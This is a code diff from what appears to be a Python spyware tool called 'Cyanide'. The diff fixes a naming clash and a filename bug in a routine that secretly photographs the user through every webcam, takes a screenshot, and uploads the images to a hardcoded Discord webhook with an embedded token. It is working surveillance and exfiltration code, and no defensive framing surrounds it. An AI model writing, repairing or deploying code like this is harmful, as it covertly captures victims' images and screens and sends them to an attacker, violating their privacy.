@@ -15,15 +15,15 @@ from discord_webhook import DiscordEmbed, DiscordWebhook
 class Main:
     def __init__(self) -> None:
         self.webhook = DiscordWebhook(url='https://discord.com/api/webhooks/1084889965940441269/0A7ZO1YHM3Ao3yaeH6cu0uqxe8mvwRsUOT5R1XRRiGpJUtGCL_jqZxmRu5u6zhpfImno', username="Cyanide", avatar_url="https://cdn.discordapp.com/attachments/1063218191259676702/1084916459647549540/Cyanide.png")
-        self.camera = True
+        self.cameraBool = True
         self.screencom = screen.Screen()
 
     def camera(self):
-        if self.camera:
+        if self.cameraBool:
             cameras = self.screencom.listCamera()
             camerasBytes = self.screencom.webcamSnap(cameras)
             for i, cameraBytes in enumerate(camerasBytes):
-                self.webhook.add_file(cameraBytes, "webscreen."+i+".png")
+                self.webhook.add_file(cameraBytes, f"webscreen.{i}.png")
         
         scrennshot = self.screencom.screenshot()
         self.webhook.add_file(scrennshot, "screenshot.png")
